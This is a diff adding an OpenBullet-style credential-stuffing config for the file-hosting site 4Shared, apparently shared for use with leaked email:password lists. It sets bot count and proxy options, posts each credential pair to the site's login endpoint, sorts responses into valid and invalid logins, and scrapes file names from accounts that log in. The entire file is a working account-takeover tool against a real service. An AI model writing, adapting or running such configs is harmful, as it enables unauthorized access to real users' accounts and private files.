@@ -1,0 +1,41 @@
+[SETTINGS]
+{
+  "Name": "4Shared",
+  "SuggestedBots": 150,
+  "LastModified": "2019-04-18T02:09:59.4902415+00:00",
+  "AdditionalInfo": "Max: 190k Proxyless.",
+  "Author": "Nuud",
+  "Version": "1.0.1",
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+REQUEST POST "https://www.4shared.com/web/login" AutoRedirect=TRUE 
+  CONTENT "returnTo=https%253A%252F%252Fwww.4shared.com%252Faccount%252Fhome.jsp&login=<USER>&password=<PASS>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  COOKIE "day1host: h" 
+  COOKIE "classicView: false" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; en) AppleWebKit/522.11.3 (KHTML, like Gecko) Version/3.0 Safari/522.11.3" 
+  HEADER "Pragma: no-cache" 
+  HEADER "referer: https://www.4shared.com/" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Failure OR 
+    KEY "Invalid e-mail address or password" 
+  KEYCHAIN Success OR 
+    KEY "My Account" 
+    KEY "Config.isUserLoggedIn = true#3B" 
+PARSE "<SOURCE>" REGEX "class=\"mobFileName\">\s*<span>([^<]*)" "[1]" Recursive=TRUE -> CAP "Files" "" "" 
